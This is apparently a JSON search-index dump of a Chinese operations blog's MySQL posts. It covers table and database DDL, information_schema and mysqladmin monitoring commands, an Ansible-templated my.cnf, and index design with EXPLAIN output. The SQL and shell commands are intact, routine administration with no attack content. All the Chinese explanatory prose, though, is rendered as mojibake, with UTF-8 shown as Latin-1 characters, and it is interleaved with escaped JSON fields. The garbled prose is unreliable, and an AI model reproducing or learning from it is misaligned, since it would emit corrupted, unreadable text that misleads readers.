mysql\u003e show create {database|schema} testdb02; ä¿®æ”¹æ•°æ®åº“å­—ç¬¦é›†(ä¿®æ”¹æ—¶éœ€è¦æ³¨æ„,å­—ç¬¦é›†ä¸€å®šæ˜¯ä»å°å¾€å¤§æ”¹,åè€…å¿…å®šæ˜¯å‰è€…çš„ä¸¥æ ¼è¶…é›†,ä¸€èˆ¬ç”Ÿäº§ä¸å»ºè®®æ”¹åŠ¨,å¦‚uft8å¯ä»¥æ”¹æˆutf8mb4) mysql\u003e alter {database|schema} testdb02 {charset|character set} utf8mb4; # collate utf8mb4_bin ä¿®æ”¹æ•°æ®åº“è¡¨å­—ç¬¦é›† mysql\u003e alter table t1 character set latin1 åˆ é™¤æ•°æ®åº“ mysql\u003e drop {database|schema} testdb02; åˆ›å»ºè¡¨ mysql\u003e create table t1(id int(10))engine=innodb charset=utf8; mysql\u003e create table t1 like t2 mysql\u003e create table t1_bak select * from t1 # å¿½ç•¥å¤–é”®/ä¸»é”® ä¿®æ”¹è¡¨å mysql\u003e rename table t1 to student; mysql\u003e alter table student rename to stu; æŸ¥çœ‹å»ºè¡¨è¯­å¥ mysql\u003e show create table stu; æ·»åŠ åˆ— mysql\u003e alter table stu add c1 int,add num int; åœ¨æŒ‡å®šåˆ—åæ·»åŠ åˆ— mysql\u003e alter table stu add stuid int after id; æ·»åŠ åˆ—åˆ°æœ€å‰ mysql\u003e alter table stu add sid int first; åˆ é™¤åˆ— mysql\u003e alter table stu drop stuid; ä¿®æ”¹åˆ—(å¯åŒæ—¶ä¿®æ”¹æ•°æ®ç±»å‹) mysql\u003e alter table stu change c1 stu_name varchar(12); ä¿®æ”¹åˆ— mysql\u003e alter table stu modify stu_name varchar(33); æŸ¥çœ‹åˆ—ç»“æ„ mysql\u003e desc stu; åˆ é™¤è¡¨ mysql\u003e drop table stu; æŸ¥çœ‹mysqlæ”¯æŒçš„å­—ç¬¦é›†å’Œæ ¡éªŒè§„åˆ™ show CHARACTER set show collation ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/:0:0","tags":["linux","mysql"],"title":"Mysqlç®¡ç†","uri":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlç›‘æ§æŒ‡æ ‡","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/","tags":["linux","mysql"],"title":"Mysqlç›‘æ§æŒ‡æ ‡","uri":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å…ƒæ•°æ®è·å– å…ƒæ•°æ®å­˜å‚¨äºinformation_schemaåº“ä¸­,å…¶ä½œç”¨å……å½“æ•°æ®åº“å…ƒæ•°æ®çš„ä¸­å¤®ç³»ç»Ÿä¿¡æ¯åº“,ä½¿ç”¨è¡¨æ ¼å½¢å¼ä»¥å®ç°çµæ´»çš„è®¿é—®,å¦å¤–ä»–æ˜¯è™šæ‹Ÿæ•°æ®åº“,å…¶è¡¨éçœŸå®è¡¨,è€Œæ˜¯ç³»ç»Ÿè§†å›¾,å…¶æ ¹æ®å½“å‰ç”¨æˆ·çš„ç‰¹æƒåŠ¨æ€å¡«å……è¡¨.åªèƒ½è¿›è¡ŒæŸ¥è¯¢. åˆ—å æè¿° table_schema è¡¨æ‰€åœ¨çš„åº“ table_name è¡¨åå­— engine è¡¨çš„å¼•æ“ table_rows è¡¨çš„è¡Œæ•° avg_row_length å¹³å‡è¡Œé•¿åº¦ index_length ç´¢å¼•é•¿åº¦ æŸ¥çœ‹å­—ç¬¦é›†é»˜è®¤æ ¡éªŒè§„åˆ™ SELECT c.CHARACTER_SET_NAME ,c.COLLATION_NAME FROM INFORMATION_SCHEMA.COLLATIONS c WHERE c.IS_DEFAULT = 'yes'; åˆ©ç”¨CONCATæ‹¼æ¥é€è¡¨å¤‡ä»½è¯­å¥ select concat(\"mysqldump -uroot --default-character-set=utf8mb4 --single-transaction -R -E \" ,t.TABLE_SCHEMA ,\" \",t.TABLE_NAME ,\" | gzip \u003e /data/backup/\",t.TABLE_SCHEMA ,\"_\" ,date_format(now(),'%Y%m%d%k%i') ,\"/\" ,t.TABLE_NAME ,\".sql.gz\") from information_schema.TABLES t where t.TABLE_SCHEMA = 'mysql' into outfile '/tmp/mysql.sql' ; -- into outfile '/tmp/mysql.sql' -- éœ€è®¾ç½®å®‰å…¨è·¯å¾„ /etc/my.cnf:[mysqld] secure-file-priv=/tmp ,é‡å¯ ç»Ÿè®¡æ¯ä¸ªåº“ä¸‹çš„æ¯ä¸ªè¡¨ä¸ªæ•°(ç›‘æ§) select table_schema,count(table_name) from `TABLES` group by table_schema; ç»Ÿè®¡æŸä¸ªåº“ä¸‹çš„æ‰€æœ‰è¡¨çš„è¡Œæ•°(ç›‘æ§) select table_name,table_rows from tables where table_schema='zabbix' ç»Ÿè®¡æŸä¸ªæ•°æ®åº“çš„æ•°æ®é‡ select table_schema,sum(avg_row_length*table_rows+index_length)/1024/1024 as size_mb from information_schema.tables group by table_schema; SELECT TABLE_SCHEMA, SUM(DATA_LENGTH)/1024/1024 as size_mb FROM TABLES GROUP BY TABLE_SCHEMA; ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/:0:0","tags":["linux","mysql"],"title":"Mysqlç›‘æ§æŒ‡æ ‡","uri":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlå¯†ç é‡ç½®","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/","tags":["linux","mysql"],"title":"Mysqlå¯†ç é‡ç½®","uri":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" é‡ç½® MySQL æˆ– MariaDB Root å¯†ç (åœ¨mysqlåœæ­¢çš„æƒ…å†µä¸‹é‡ç½®mysqlå¯†ç ) https://linux.cn/article-9990-1.html?utm_source=index\u0026utm_medium=moremore ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/:0:0","tags":["linux","mysql"],"title":"Mysqlå¯†ç é‡ç½®","uri":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlå‘½ä»¤æ”¶é›†","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","tags":["linux","mysql"],"title":"Mysqlå‘½ä»¤æ”¶é›†","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"DBA è´¦å·æˆæƒ GRANT ALL PRIVILEGES ON *.* TO 'root'@'ip' Identified by \"å¯†ç \" WITH GRANT OPTION; æ£€æµ‹mysql serveræ˜¯å¦æ­£å¸¸æä¾›æœåŠ¡ mysqladmin -u sky -ppwd -h localhost ping è·å–mysqlå½“å‰çš„å‡ ä¸ªçŠ¶æ€å€¼ mysqladmin -u sky -ppwd -h localhost status è·å–æ•°æ®åº“å½“å‰çš„è¿æ¥ä¿¡æ¯ mysqladmin -u sky -ppwd -h localhost processlist è·å–å½“å‰æ•°æ®åº“çš„è¿æ¥æ•° mysql -u root -ppwd -BNe \"select host,count(host) from processlist group by host;\" information_schema æ˜¾ç¤ºmysqlçš„uptime mysql -e\"SHOW STATUS LIKE '%uptime%'\"|awk '/ptime/{ calc = $NF / 3600;print $(NF-1), calc\"Hour\" }' æŸ¥çœ‹æ•°æ®åº“çš„å¤§å° mysql -u root -ppwd-e 'select table_schema,round(sum(data_length+index_length)/1024/1024,4) from information_schema.tables group by table_schema;' æŸ¥çœ‹æŸä¸ªè¡¨çš„åˆ—ä¿¡æ¯ mysql -u \u003cuser\u003e --password=\u003cpassword\u003e -e \"SHOW COLUMNS FROM \u003ctable\u003e\" \u003cdatabase\u003e | awk '{print $1}' | tr \"\\n\" \",\" | sed 's/,$//g' æ‰§è¡Œmysqlè„šæœ¬ mysql -u user-name -p password \u003c script.sql mysqlè¿›ç¨‹ç›‘æ§ ps -ef | grep \"mysqld_safe\" | grep -v \"grep\" ps -ef | grep \"mysqld\" | grep -v \"mysqld_safe\"| grep -v \"grep\" æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„çŠ¶æ€ mysql -u root -ppwd -e 'show status' mysqlcheck å·¥å…·ç¨‹åºå¯ä»¥æ£€æŸ¥(check),ä¿® å¤( repair),åˆ† æ( analyze)å’Œä¼˜åŒ–(optimize)MySQL Server ä¸­çš„è¡¨ mysqlcheck -u root -ppwd --all-databases mysql qpsæŸ¥è¯¢ QPS = Questions(or Queries) / Seconds mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Questions\"' mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Queries\"' mysql Key Buffer å‘½ä¸­ç‡ key_buffer_read_hits = (1 - Key_reads / Key_read_requests) * 100% key_buffer_write_hits= (1 - Key_writes / Key_write_requests) * 100% mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Key%\"' mysql Innodb Buffer å‘½ä¸­ç‡ innodb_buffer_read_hits=(1-Innodb_buffer_pool_reads/Innodb_buffer_pool_read_requests) * 100% mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Innodb_buffer_pool_read%\"' mysql Query Cache å‘½ä¸­ç‡ Query_cache_hits= (Qcache_hits / (Qcache_hits + Qcache_inserts)) * 100% mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Qcache%\"' mysql Table Cache çŠ¶æ€é‡ mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Open%\"' mysql Thread Cache å‘½ä¸­ç‡ Thread_cache_hits = (1 - Threads_created / Connections) * 100% æ­£å¸¸æ¥è¯´,Thread Cache å‘½ä¸­ç‡è¦åœ¨ 90% ä»¥ä¸Šæ‰ç®—æ¯”è¾ƒåˆç†ã€‚ mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Thread%\"' mysql é”å®šçŠ¶æ€:é”å®šçŠ¶æ€åŒ…æ‹¬è¡¨é”å’Œè¡Œé”ä¸¤ç§,æˆ‘ä»¬å¯ä»¥é€šè¿‡ç³»ç»ŸçŠ¶æ€å˜é‡è·å¾—é”å®šæ€»æ¬¡æ•°,é”å®šé€ æˆå…¶ä»–çº¿ç¨‹ç­‰å¾…çš„æ¬¡æ•°,ä»¥åŠé”å®šç­‰å¾…æ—¶é—´ä¿¡æ¯ mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"%lock%\"' mysql å¤åˆ¶å»¶æ—¶é‡ åœ¨slaveèŠ‚ç‚¹æ‰§è¡Œ mysql -u root -ppwd -e 'SHOW SLAVE STATUS' mysql Tmp table çŠ¶å†µ Tmp Table çš„çŠ¶å†µä¸»è¦æ˜¯ç”¨äºç›‘æ§ MySQL ä½¿ç”¨ä¸´æ—¶è¡¨çš„é‡æ˜¯å¦è¿‡å¤š,æ˜¯å¦æœ‰ä¸´æ—¶è¡¨è¿‡å¤§è€Œä¸å¾—ä¸ä»å†…å­˜ä¸­æ¢å‡ºåˆ°ç£ç›˜æ–‡ä»¶ä¸Š mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Created_tmp%\"' mysql Binlog Cache ä½¿ç”¨çŠ¶å†µ:Binlog Cache ç”¨äºå­˜æ”¾è¿˜æœªå†™å…¥ç£ç›˜çš„ Binlog ä¿¡ æ¯ ã€‚ mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Binlog_cache%\"' mysql nnodb_log_waits é‡:Innodb_log_waits çŠ¶æ€å˜é‡ç›´æ¥ååº”å‡º Innodb Log Buffer ç©ºé—´ä¸è¶³é€ æˆç­‰å¾…çš„æ¬¡æ•° mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Innodb_log_waits' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:0:0","tags":["linux","mysql"],"title":"Mysqlå‘½ä»¤æ”¶é›†","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlé…ç½®æ–‡ä»¶","date":"2022-06-24","objectID":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/","tags":["linux","mysql"],"title":"Mysqlé…ç½®æ–‡ä»¶","uri":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"ä¿®æ”¹é…ç½®æ–‡ä»¶(é»˜è®¤çš„/etc/my.cnfæ˜¯mariadbçš„) https://blog.51cto.com/moerjinrong/2092791 å‚æ•°ä¼˜å…ˆçº§: å‘½ä»¤è¡Œå‚æ•°æŒ‡å®š \u003e é…ç½®æ–‡ä»¶ my.cnf(æŒ‡å®šé…ç½®æ–‡ä»¶\u003eæ•°æ®ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶\u003eetcä¸‹çš„é…ç½®æ–‡ä»¶) \u003e é»˜è®¤å‚æ•° æ ‡ç­¾é…ç½®åˆ†ç±» æ ‡ç­¾ç”¨æŸä¸ªç‰¹å®šçš„æ ‡ç­¾å€¼æ¥è¡¨ç¤ºä»¥ä¸‹å†…å®¹é’ˆå¯¹äºæŸä¸ªç¨‹åº(å‘½ä»¤)ä½“ç°çš„,ä¸€èˆ¬å¯åˆ†æ–‡[client]ã€[server]ä¸¤å¤§ç±» [client]: é’ˆå¯¹å…¨éƒ¨å®¢æˆ·ç«¯ [mysql]: æ ‡ç­¾ä¸‹å†…å®¹é’ˆå¯¹mysqlè¿™ä¸ªç¨‹åº(å‘½ä»¤)æ¥è®¾ç½®çš„ [mysqladmin]: â€¦ [mysqldump]: â€¦ [server]: é’ˆå¯¹å…¨éƒ¨æœåŠ¡ç«¯ [mysqld_safe]: æ ‡ç­¾ä¸‹å†…å®¹é’ˆå¯¹mysqld_safeè¿™ä¸ªç¨‹åº(å‘½ä»¤)æ¥è®¾ç½®çš„( mysqld_safeæ˜¯ç”¨æ¥ç®¡ç†mysqldçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œå…¶å¢åŠ äº†ä¸€äº›å®‰å…¨ç‰¹æ€§ ) [mysqld]: æ ‡ç­¾ä¸‹å†…å®¹é’ˆå¯¹mysqldè¿™ä¸ªç¨‹åº(å‘½ä»¤)æ¥è®¾ç½®çš„ é…ç½®æ–‡ä»¶ç¤ºä¾‹(ansibleåˆå§‹åŒ–ç¤ºä¾‹) æ³¨æ„é…ç½®æ–‡ä»¶æ¯è¡Œåä¸èƒ½æœ‰ç©ºæ ¼,éœ€ç›´æ¥æ¢è¡Œ ; ç›®å½•ç»“æ„ ; mysqldb ; â””â”€â”€ 3306 ; â”œâ”€â”€ binlog ; â”œâ”€â”€ data ; â”œâ”€â”€ logs ; â”œâ”€â”€ relaylog ; â””â”€â”€ tmp [client] port={{ MYSQL_PORT|default(3306) }} default-character-set = utf8 socket = {{ DATA_ROOT }}/mysql.sock ; prompt = '\\u@\\h [\\d] \u003e\\_' [mysqld] port={{ MYSQL_PORT|default(3306) }} bind-address = 0.0.0.0 character-set-server = utf8 collation-server = utf8_general_ci socket = {{ DATA_ROOT }}/mysql.sock pid-file = {{ DATA_ROOT }}/mysql.pid ; äºŒè¿›åˆ¶å®‰è£…é…ç½® basedir = {{ BASEDIR }} datadir = {{ DATA_ROOT }}/data tmpdir = {{ DATA_ROOT }}/tmp ; å­˜åœ¨å¤§é‡æäº¤æ—¶å»ºè®®å…³é—­æäº¤(é»˜è®¤å¼€å¯) autocommit=on ; ç¬¬ä¸€ä¸ªibdata å¿…å®šæ˜¯ä¸€ä¸ªå›ºå®šå¤§å°çš„ï¼Œè‹¥åœ¨å¯åŠ¨åä¿®æ”¹ï¼Œåˆ™éœ€è¦è®¾ç½®ä¸å®é™…å¤§å°ä¸€è‡´ï¼Œä¸èƒ½å¤šä¹Ÿä¸èƒ½å°‘ï¼Œç¬¬äºŒä¸ªåˆ™ä¸å—é™åˆ¶(é»˜è®¤æ˜¯ä¸‹12M) innodb_data_file_path=ibdata1:512M;ibdata2:512M:autoextend ; å¸¸è§„æ—¥å¿—ï¼Œè®°å½•æ‰€æœ‰æˆåŠŸçš„è¯­å¥(é»˜è®¤å…³é—­,ä¸å»ºè®®å¼€å¯) general_log=off general_log_file={{ DATA_ROOT }}/logs/server2.log ; é”™è¯¯æ—¥å¿—,è®°å½•æ•°æ®åº“çš„ä¸€èˆ¬çŠ¶æ€åŠæŠ¥é”™ä¿¡æ¯,æ˜¯æˆ‘ä»¬å¯¹äºæ•°æ®åº“å¸¸è§„æŠ¥é”™å¤„ç†çš„å¸¸ç”¨æ—¥å¿— log-error={{ DATA_ROOT }}/logs/mysqld.log ; ç¦ç”¨dnsè§£æ(åªèƒ½ä½¿ç”¨ip) skip-name-resolve ; äºŒè¿›åˆ¶æ—¥å¿—æ§åˆ¶ start ; å»ºè®®è®¾ç½®å…¨å¤‡+1å¤© ; expire_logs_days = 8 ; å„ä¸ªèŠ‚ç‚¹ä¸ä¸€æ · server_id = {{ 65535 |random(1,9) }} ; sync_binlog ä¸º1æ—¶, æ¯æ¬¡æäº¤éƒ½ä¼šå‘ç£ç›˜ä¸­å†™å…¥æ•°æ®(bin-logç›®å½•æœ€å¥½å’Œæ•°æ®ç›®å½•åˆ†å¼€),æœ€å®‰å…¨ä½†æ˜¯æ€§èƒ½æŸè€—æœ€å¤§,ä¸å»ºè®®å¼€å¯ sync_binlog=0 master_info_repository=TABLE log-bin = {{ DATA_ROOT }}/binlog/mysql-bin binlog_format = row ; å…³é—­relay_log è‡ªåŠ¨æ¸…ç†åŠŸèƒ½ relay_log_purge = 0 relay_log_info_repository=TABLE relay-log = {{ DATA_ROOT }}/relaylog/mysql-relay-bin ; ä¸»ä»åŒæ­¥é‡è¿æ—¶é—´(é»˜è®¤3600s)ï¼Œä»åº“å¤šé•¿æ—¶é—´æœªæ”¶åˆ°ä¸»åº“ä¼ æ¥çš„Binary Logs eventsåä»è€Œåˆ¤å®šè¶…æ—¶,slaveIOçº¿ç¨‹é‡è¿,è¶Šé¢‘ç¹å»ºè®®è®¾ç½®è¶Šå° slave_net_timeout = 5 ; å¯ç”¨GTID,ä¸å¯ç”¨åˆ™ä¸ºæ™®é€šå¤åˆ¶(å•èŠ‚ç‚¹å¼€å¯æ— æ„ä¹‰) gtid-mode=on ; å¼ºåˆ¶GTIDçš„ä¸€è‡´æ€§ enforce-gtid-consistency=true ; slaveæ›´æ–°æ˜¯å¦è®°å½•æ—¥å¿— (å¤šä¸»ç¯å¢ƒå¿…åŠ ) log-slave-updates=1 ; äºŒè¿›åˆ¶æ—¥å¿—æ§åˆ¶ end ; æ‰“å¼€å¹¶è®°å½•æ…¢æ—¥å¿— slow_query_log = OFF slow_query_log_file = {{ DATA_ROOT }}/logs/slow.log ; è®¾å®šè¶…è¿‡å¤šå°‘æ—¶é—´(s)çš„sqlä¼šè¢«è®°å½•,ä¸€èˆ¬ä¸ä¼šè¶…è¿‡1ç§’ long_query_time = 0.5 ; ä¸ä½¿ç”¨ç´¢å¼•çš„æ…¢æŸ¥è¯¢æ—¥å¿—æ˜¯å¦è®°å½•åˆ°ç´¢å¼• log_queries_not_using_indexes = on ; æŸ¥è¯¢ç»“æœå°äºå¤šå°‘è¡Œçš„å°†ä¸ä¼šè®°å½•,æ­¤å‚æ•°éœ€è¦å‚è€ƒè€…è®¾ç½® ; min_examined_row_limit=100 ; fix: Got an error reading communication packets max_allowed_packet = 16M ; mysql ä¼˜åŒ– start open_files_limit = 65535 ; mysql ä¼˜åŒ– end [mysqldump] quick max_allowed_packet = 128M ; mysqldump -uroot -p -A -R --triggers --master-data=2 --single-transaction|gzip \u003e /backup/all_$(date +\"%F-%T\").sql.gz ; ignore-table=database.table ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/:0:0","tags":["linux","mysql"],"title":"Mysqlé…ç½®æ–‡ä»¶","uri":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlä¼˜åŒ–","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/","tags":["linux","mysql"],"title":"Mysqlä¼˜åŒ–","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. Mysql ä¼˜åŒ– 1.1. ç´¢å¼•ä¼˜åŒ– ç´¢å¼•çš„ç§ç±» Bæ ‘(b-tree B+tree B*tree); Ræ ‘; Hashç´¢å¼• å…¨æ–‡ç´¢å¼• Bæ ‘ç´¢å¼•çš„ç±»å‹ èšç°‡ç´¢å¼•(cluster index): ä¸€èˆ¬æ˜¯åŸºäºä¸»é”®çš„,è‡ªåŠ¨ç”Ÿæˆ,ä¸€èˆ¬æ˜¯å»ºè¡¨æ—¶åˆ›å»º è¾…åŠ©ç´¢å¼•(æ™®é€šç´¢å¼•:å›è¡¨æŸ¥è¯¢; è¦†ç›–ç´¢å¼•: ä¸å›è¡¨æŸ¥è¯¢): è®¤ä¸ºåˆ›å»º(æ™®é€šå‹,è¦†ç›–å‹) å”¯ä¸€é”®ç´¢å¼•: è®¤ä¸ºåˆ›å»º ä½œç”¨ åœ¨æ•°æ®åº“ä¸­,ç´¢å¼•æ˜¯ç”¨æ¥ä¼˜åŒ–æŸ¥è¯¢çš„. æ’é™¤ç¼“å­˜ä¹‹å¤–,æ•°æ®çš„æŸ¥è¯¢: 1. å…¨è¡¨æ‰«æ; 2. ç´¢å¼•æ‰«æ 1.1.1. ç´¢å¼•åˆ†ç±» ä¸»é”®ç´¢å¼• --- åˆ›å»ºä¸»é”®ç´¢å¼•(æ¨è) create table `\u003ctable_name\u003e` ( `id` int(4) not null auto_increment, `name` char(20) not null, primary key (`id`) ) engine=innodb default charset=utf8 --- åˆ›å»ºä¸»é”®ç´¢å¼• create table `\u003ctable_name\u003e` ( `id` int(4) not null, `name` char(20) not null ) engine=innodb default charset=utf8 alter table \u003ctable_name\u003e change id id int(4) primary key not null auto_increment æ™®é€šç´¢å¼•(MUL) --- åˆ›å»ºç´¢å¼• mysql\u003e alter table \u003ctable_name\u003e add index \u003cindex_name\u003e(\u003ccolumn_name\u003e); # create index \u003cindex_name\u003e on \u003ctable_name\u003e(\u003ccolumn_name\u003e); --- åˆ é™¤ç´¢å¼• mysql\u003e alter table \u003ctable_name\u003e drop index \u003cindex_name\u003e; # drop index \u003cindex_name\u003e on \u003ctable_name\u003e; --- æŸ¥çœ‹ç´¢å¼•ä¿¡æ¯ mysql\u003e show index from \u003ctable_name\u003e; å”¯ä¸€ç´¢å¼• mysql\u003e create unique index \u003cindex_name\u003e on \u003ctable_name\u003e(\u003ccolumn_name\u003e) å‰ç¼€ç´¢å¼• --- create index idx_phoneNum on phone(phoneNum(3)) mysql\u003e create index \u003cindex_name\u003e on \u003ctable_name\u003e(\u003ccolumn_name\u003e(\u003clength\u003e)) è”åˆç´¢å¼• # index(a,b,c) # a, ab, abc ,ac èµ°ç´¢å¼•, å…¶ä»–å…³è”æŸ¥è¯¢å‡ä¸èµ°ç´¢å¼•(å¦‚ b,bc,c ) mysql\u003e alter table \u003ctable_name\u003e add index \u003cindex_name\u003e(\u003ccloumn_name1\u003e,\u003ccloumn_name2\u003e,\u003ccloumn_name3\u003e) 1.1.2. æŸ¥çœ‹æŸä¸ªè¯­å¥åœ¨æŸ¥è¯¢æ—¶æ˜¯å¦ä½¿ç”¨äº†ç´¢å¼•,ä½¿ç”¨äº†é‚£äº›ç´¢å¼• mysql\u003e explain select * from world.city where Name = 'Chongqing'\\G ***************************[ 1. row ]*************************** id | 1 select_type | SIMPLE table | city type | ref possible_keys | idx_name key | idx_name key_len | 35 ref | const rows | 1 Extra | Using index condition -- type: è¡¨ç¤ºmysqlåœ¨è¡¨ä¸­æ‰¾åˆ°æ‰€éœ€è¡Œçš„æ–¹å¼,åˆç§°\"è®¿é—®ç±»å‹\" --- å¸¸è§ç±»å‹æœ‰: ALL,index,range,ref,eq_ref, const,system, NULL ä»å·¦åˆ°åˆ,æ€§èƒ½ä»å·®åˆ°å¥½ --- ALL: å…¨è¡¨æ‰«æ,æœªä½¿ç”¨ç´¢å¼•æŸ¥è¯¢(1. è¯­å¥å†™çš„æœ‰é—®é¢˜, 2. ç´¢å¼•é—®é¢˜) --- index: å…¨ç´¢å¼•æ‰«æ ---- explain select count(*) from city ; --- range: èŒƒå›´æ‰«æ, å…³é”®å­—åŒ…å« \u003eã€\u003cã€\u003e=ã€\u003c=ã€between...andã€in()ã€orã€like 'x%' ---- explain select * from city where `CountryCode` like 'CH%' --- ref: ä½¿ç”¨éå”¯ä¸€ç´¢å¼•(å³éä¸»é”®æˆ–å”¯ä¸€ç´¢å¼•)æ‰«ææˆ–è€…å”¯ä¸€çš„å‰ç¼€æ‰«æï¼Œè¿”å›åŒ¹é…æŸä¸ªå•ç‹¬å€¼çš„è®°å½•è¡Œ ---- explain select * from city where Name = 'Chongqing' --- eq_ref: ç±»ä¼¼refï¼ŒåŒºåˆ«å°±æ˜¯åœ¨ä½¿ç”¨çš„ç´¢å¼•æ˜¯å”¯ä¸€ç´¢å¼•ï¼Œå¯¹äºæ¯ä¸ªç´¢å¼•é”®å€¼ï¼Œè¡¨ä¸­åªæœ‰ä¸€æ¡è®°å½•åŒ¹é…(joinæ¡ä»¶ä½¿ç”¨çš„æ˜¯primary key æˆ–è€… unique key) --- constã€system: å°†ç»„ä»¶è®¾ç½®ä¸ºwhere çš„æ¡ä»¶ ---- explain select * from city where id = 1; --- NULL: -------- -- key_len: ä»£è¡¨ç´¢å¼•é•¿åº¦ï¼Œè‹¥ç´¢å¼•é•¿åº¦è¾ƒé•¿ï¼Œå¯ä»¥å°†å…¶æ›¿æ¢ä¸ºå‰ç¼€ç´¢å¼• -- Extra: ç›¸å½“äºä¸€ä¸ªæè¿°å§ --- å½“å‡ºç° Using temporary; Using filesort; Using join buffer æ—¶å€™ï¼Œä¸€èˆ¬ä»£è¡¨æ¶‰åŠåˆ°æ’åºæ“ä½œæ—¶éƒ¨åˆ†æ•°æ®å¯èƒ½æœªèµ°ç´¢å¼•ï¼Œå› æ­¤å¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚ 1.1.3. ç´¢å¼•è®¾è®¡çš„åŸåˆ™ ä¸ºäº†ä½¿ç´¢å¼•çš„ä½¿ç”¨æ•ˆç‡æ›´é«˜ï¼Œåœ¨åˆ›å»ºç´¢å¼•æ—¶ï¼Œå¿…é¡»è€ƒè™‘åœ¨å“ªäº›å­—æ®µä¸Šåˆ›å»ºç´¢å¼•å’Œåˆ›å»ºä»€ä¹ˆç±»å‹çš„ç´¢å¼•ã€‚ é‚£ä¹ˆç´¢å¼•è®¾è®¡åŸåˆ™åˆæ˜¯æ€æ ·çš„? 1.1.3.1. è¿ç»´è§„èŒƒ é€‰æ‹©å”¯ä¸€æ€§ç´¢å¼•(é‡ç‚¹å…³æ³¨) å”¯ä¸€æ€§ç´¢å¼•çš„å€¼æ˜¯å”¯ä¸€çš„ï¼Œå¯ä»¥æ›´å¿«é€Ÿçš„é€šè¿‡è¯¥ç´¢å¼•æ¥ç¡®å®šæŸæ¡è®°å½•ã€‚ä¾‹å¦‚ï¼Œå­¦ç”Ÿè¡¨ä¸­å­¦å·æ˜¯å…·æœ‰å”¯ä¸€æ€§çš„å­—æ®µã€‚ä¸ºè¯¥å­—æ®µå»ºç«‹å”¯ä¸€æ€§ç´¢å¼•å¯ä»¥å¾ˆå¿«çš„ç¡®å®šæŸä¸ªå­¦ç”Ÿçš„ä¿¡æ¯ã€‚ å¦‚æœä½¿ç”¨å§“åçš„è¯ï¼Œå¯èƒ½å­˜åœ¨åŒåç°è±¡ï¼Œä»è€Œé™ä½æŸ¥è¯¢é€Ÿåº¦ã€‚ä¸»é”®ç´¢å¼•å’Œå”¯ä¸€é”®ç´¢å¼•ï¼Œåœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨æ˜¯æ•ˆç‡æœ€é«˜çš„ã€‚ ä¸ºç»å¸¸éœ€è¦æ’åºã€åˆ†ç»„å’Œè”åˆæ“ä½œçš„å­—æ®µå»ºç«‹ç´¢å¼•(é‡ç‚¹å…³æ³¨) ç»å¸¸éœ€è¦ORDER BYã€GROUP BYã€DISTINCTå’ŒUNIONç­‰æ“ä½œçš„å­—æ®µï¼Œæ’åºæ“ä½œä¼šæµªè´¹å¾ˆå¤šæ—¶é—´ã€‚ å¦‚æœä¸ºå…¶å»ºç«‹ç´¢å¼•ï¼Œå¯ä»¥æœ‰æ•ˆåœ°é¿å…æ’åºæ“ä½œã€‚ 